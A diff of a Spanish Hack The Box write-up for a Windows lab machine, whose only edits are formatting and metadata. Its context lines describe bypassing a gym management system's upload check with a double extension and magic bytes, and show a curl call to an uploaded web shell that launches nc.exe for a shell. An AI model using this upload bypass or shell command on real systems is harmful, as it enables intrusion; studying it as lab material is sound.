@@ -8,7 +8,7 @@ web: https://app.hackthebox.com/machines/263
 dificultad: Fácil
 ip: 10.10.10.198
 os: Windows
-relacionados:
+linked:
   - "[[Remote Code Execution|RCE]]"
   - "[[Gym Management System Exploitation]]"
   - "[[CloudMe Exploitation]]"
@@ -37,7 +37,7 @@ El resultado más interesante fue el puerto **8080**, donde encontré un servido
 Navegando por el sitio, descubrí la página `/contact`, la cual revelaba la tecnología subyacente: **Gym Management System 1.0**.
 
 
-___
+---
 
 ## Análisis de vulnerabilidades
 
@@ -72,7 +72,7 @@ El script upload.php presenta dos fallos críticos:
 >2. **Validación de Archivo Inadecuada:** Aunque verifica la extensión y el tipo de contenido, esta validación es superficial. Se puede eludir utilizando un nombre de archivo con doble extensión (ej. `shell.php.png`) y añadiendo los _magic bytes_ de un archivo de imagen al principio de nuestro payload malicioso. Además, el nombre del archivo final se construye usando el parámetro `id` de la URL, lo que me da control total sobre el nombre del archivo subido en el servidor.
     
 
-___
+---
 
 ## Explotación de vulnerabilidades
 
@@ -141,7 +141,7 @@ curl "http://10.10.10.198:8080/upload/test.php?cmd=c%3A%5Cusers%5Cpublic%5Cnc.ex
 Con esto, logré obtener una shell en el sistema como el usuario `shaun`.
 
 
-___
+---
 
 ## Escalada de privilegios
 
